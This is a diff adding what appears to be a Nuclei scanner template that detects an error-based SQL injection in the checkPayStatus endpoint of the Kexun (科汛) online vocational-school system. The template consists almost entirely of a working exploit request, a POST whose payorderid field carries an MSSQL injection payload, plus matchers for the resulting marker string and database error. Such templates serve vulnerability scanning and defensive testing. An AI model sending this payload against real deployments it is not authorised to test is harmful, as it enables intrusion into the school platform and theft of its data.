@@ -1,0 +1,27 @@
+id: kexunEDU-checkPayStatus-sql
+
+info:
+  name: 科汛新职教网校系统 checkPayStatus SQL注入漏洞
+  author: kexunEDU
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        POST /Webapi/Common/checkPayStatus HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"payorderid":"1' AND 7755 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(112)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (7755=7755) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(107)+CHAR(107)+CHAR(113)))-- Ahbw","apptoken":"1"}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'qkpzq1qqkkq'
+          - '转换成数据类型 int 时失败'
+        condition: and
+      - type: status
+        status: 
+          - 500
